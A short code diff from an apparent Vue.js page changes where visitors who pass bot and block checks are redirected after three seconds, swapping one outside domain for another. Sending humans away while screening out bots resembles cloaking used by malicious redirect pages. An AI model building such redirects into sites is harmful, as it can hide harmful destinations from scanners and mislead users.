@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://ost.hst-ltd.com/';
+          window.location.href = 'https://tt.fumoff.com/';
         }, 3000);
       }
     });
